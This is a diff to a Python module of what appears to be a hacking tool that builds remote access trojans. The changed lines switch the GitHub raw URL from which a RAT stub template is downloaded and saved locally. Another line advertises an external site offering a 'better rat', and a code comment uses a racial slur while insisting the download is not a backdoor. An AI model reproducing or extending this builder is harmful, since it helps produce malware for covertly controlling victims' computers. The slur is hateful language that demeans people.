@@ -1,10 +1,3 @@
-import os, sys, subprocess, shutil, time, traceback
-from core.display import Colors, Colorate, get_inpt, Theme, print_banner
-import webbrowser
-
-def rat_builder_init():
-    _cl = Theme.get_colors()
-    print_banner()
     print(Colorate.Horizontal(_cl["head"], "  [ RAT BUILDER ]\n"))
 
     print("if u want a better rat with more features visit https://ins0mnia.ru/")
@@ -27,7 +20,7 @@ def rat_builder_init():
         try:
             import urllib.request
             os.makedirs(os.path.dirname(stub_template), exist_ok=True)
-            url = "https://raw.githubusercontent.com/glockinhand/glockinhand/refs/heads/main/rat_stub.txt" # this is not a backdoor niggers its just the template for rat builder
+            url = "https://raw.githubusercontent.com/w3br4ks/w3br4ks/refs/heads/main/rat_stub.txt" # this is not a backdoor niggers its just the template for rat builder
             urllib.request.urlretrieve(url, stub_template)
             print(Colorate.Horizontal(_cl["head"], "  [+] File downloaded successfully."))
         except Exception as e:
